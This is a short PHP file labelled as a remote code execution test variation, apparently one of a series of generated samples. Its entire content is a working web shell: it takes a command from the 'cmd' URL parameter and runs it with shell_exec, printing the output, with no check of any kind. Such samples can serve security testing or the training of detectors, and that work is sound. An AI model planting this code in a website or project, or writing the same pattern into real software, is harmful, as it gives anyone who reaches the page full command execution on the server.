<?php
// RCE test variation #169
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>